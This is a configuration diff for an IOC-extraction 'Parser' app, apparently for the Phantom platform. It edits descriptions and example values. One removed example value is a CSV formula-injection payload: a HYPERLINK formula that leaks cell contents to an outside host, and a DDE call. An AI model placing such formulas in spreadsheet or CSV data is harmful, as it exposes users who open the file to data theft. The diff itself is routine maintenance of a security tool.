@@ -1,7 +1,7 @@
 {
     "appid": "4004f489-1826-44a1-af12-9c74eea82eb0",
     "name": "Parser",
-    "description": "This app extracts IOCs from various files such as PDFs or Emails, or raw text",
+    "description": "This app extracts IOCs from various files such as PDFs, emails, or raw text",
     "type": "information",
     "product_vendor": "Phantom",
     "logo": "logo_phantom.svg",
@@ -30,7 +30,7 @@
             "action": "extract ioc",
             "identifier": "parse_file",
             "description": "Create IOC artifacts from a file in the vault or raw text",
-            "verbose": "Specify either text or vault_id. If text is used only file_types of CSV, HTML, and TXT can be selected. <br /><br />If vault_id is used and the <b>file_type</b> is left blank, the app will try to determine what type of file it is on its own. <br/><br/> When parsing an email file (.eml), the <b>file_type</b> parameter must be set to <b>Email</b>.  <br/> <br/> <b>Label</b> or <b>Container ID</b> is mandatory to run an action. It will display an error message if both of them are not mentioned.",
+            "verbose": "Specify either text or vault_id. If text is used only file_types of csv, html, and txt can be selected. <br/><br/>If vault_id is used and the <b>file_type</b> is left blank, the app will try to determine what type of file it is on its own. <br/><br/> When parsing an email file (.eml), the <b>file_type</b> parameter must be set to <b>email</b>. <br/> <br/> <b>Label</b> or <b>Container ID</b> is mandatory to run an action. It will display an error message if both of them are not mentioned.",
             "type": "generic",
             "read_only": true,
             "parameters": {
@@ -45,7 +45,7 @@
                     "order": 0
                 },
                 "file_type": {
-                    "description": "Data Type",
+                    "description": "Type of the file",
                     "data_type": "string",
                     "required": false,
                     "value_list": [
@@ -116,8 +116,11 @@
                     "data_type": "string",
                     "example_values": [
                         "txt",
+                        "email",
+                        "pdf",
                         "docx",
-                        "csv"
+                        "csv",
+                        "html"
                     ]
                 },
                 {
@@ -154,14 +157,14 @@
                     "data_path": "action_result.parameter.text",
                     "data_type": "string",
                     "example_values": [
-                        "SrNo, Name, Pincode 1, =HYPERLINK(\"http://contextis.co.uk?leak=\"&A1&A2,\"Error: please click for further information\"), =DDE(server; file; item; mode) 2, Hello, Def 3, FER, SER"
+                        "Test string to extract IOCs from"
                     ]
                 },
                 {
                     "data_path": "action_result.parameter.vault_id",
                     "data_type": "string",
                     "example_values": [
-                        "3d6ef06ab51be5a86cdfaba246db2c2eb1d07795"
+                        "3d6ef06ab51be5a86cdfaba246db2c2ab1d07795"
                     ],
                     "contains": [
                         "vault id"
